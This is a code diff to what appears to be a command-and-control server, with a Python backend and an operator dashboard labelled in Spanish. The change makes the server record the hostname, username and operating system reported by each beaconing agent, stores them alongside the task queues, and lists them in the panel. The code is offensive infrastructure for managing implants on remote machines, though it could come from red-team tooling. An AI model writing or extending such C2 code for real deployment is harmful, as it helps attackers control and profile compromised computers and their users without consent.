@@ -254,7 +254,7 @@ tr.selected td:first-child{border-left:2px solid #00ff41}
       <div class="panel-title">Agentes conectados</div>
       <div class="tbl-wrap">
         <table>
-          <thead><tr><th>Estado</th><th>Agent ID</th><th>Beacon</th><th>Cola</th><th>Inflight</th></tr></thead>
+          <thead><tr><th>Estado</th><th>Usuario</th><th>Host</th><th>OS</th><th>Beacon</th></tr></thead>
           <tbody id="agent-rows"><tr><td colspan="5" class="empty">Sin agentes</td></tr></tbody>
         </table>
       </div>
@@ -505,10 +505,10 @@ async function refresh(){
     document.getElementById('agent-rows').innerHTML=agents.length?agents.map(a=>
       `<tr onclick="pick('${a.agent_id}')"${a.agent_id===sel?' class="selected"':''}>
       <td><span class="dot ${a.status}"></span>${a.status}</td>
-      <td style="font-size:.72em;color:#8888a8">${a.agent_id}</td>
-      <td>${jBar(a.last_seen,a.status)}</td>
-      <td>${a.pending_tasks}</td>
-      <td>${a.inflight_tasks>0?`<span style="color:#ffaa00">${a.inflight_tasks} &#8599;</span>`:'0'}</td></tr>`
+      <td style="color:#00ff41;font-weight:600">${a.username||a.agent_id.slice(0,8)}</td>
+      <td style="color:#c0c0e0">${a.hostname||'—'}</td>
+      <td style="font-size:.78em;color:#8888b8">${a.os_name||'—'}</td>
+      <td>${jBar(a.last_seen,a.status)}</td></tr>`
     ).join(''):'<tr><td colspan="5" class="empty">Sin agentes registrados</td></tr>';
     document.getElementById('st-left').textContent=on+' agente'+(on!==1?'s':'')+' online';
     document.getElementById('st-right').textContent=new Date().toLocaleTimeString();
@@ -638,6 +638,9 @@ def _ensure_agent(agent_id: str) -> None:
             "status":        "online",
             "pending_tasks": 0,
             "inflight_tasks": 0,
+            "hostname":      "",
+            "username":      "",
+            "os_name":       "",
         }
         results[agent_id]  = []
         tasks[agent_id]    = asyncio.Queue(maxsize=TASK_QUEUE_MAX)
@@ -764,6 +767,12 @@ async def _handle_beacon_clear(payload: bytes) -> web.Response:
                             content_type="application/octet-stream")
 
     _ensure_agent(agent_id)
+    if data.get("hostname"):
+        agents[agent_id]["hostname"] = data["hostname"]
+    if data.get("username"):
+        agents[agent_id]["username"] = data["username"]
+    if data.get("os"):
+        agents[agent_id]["os_name"] = data["os"]
     log.info("BEACON agent_id=%.8s ts=%s", agent_id, data.get("ts", "?"))
 
     q = tasks.get(agent_id)
@@ -833,6 +842,13 @@ async def _dispatch_encrypted(
         elif agent_id:
             _ensure_agent(agent_id)
             log.info("BEACON(enc) agent_id=%.8s", agent_id)
+        if agent_id and agent_id in agents:
+            if data.get("hostname"):
+                agents[agent_id]["hostname"] = data["hostname"]
+            if data.get("username"):
+                agents[agent_id]["username"] = data["username"]
+            if data.get("os"):
+                agents[agent_id]["os_name"] = data["os"]
 
         q = tasks.get(agent_id or "")
         if q and not q.empty():
@@ -895,6 +911,9 @@ async def api_list_agents(request: web.Request) -> web.Response:
             "status":        a["status"],
             "pending_tasks": a["pending_tasks"],
             "inflight_tasks": a.get("inflight_tasks", 0),
+            "hostname":      a.get("hostname", ""),
+            "username":      a.get("username", ""),
+            "os_name":       a.get("os_name", ""),
         }
         for a in agents.values()
     ]
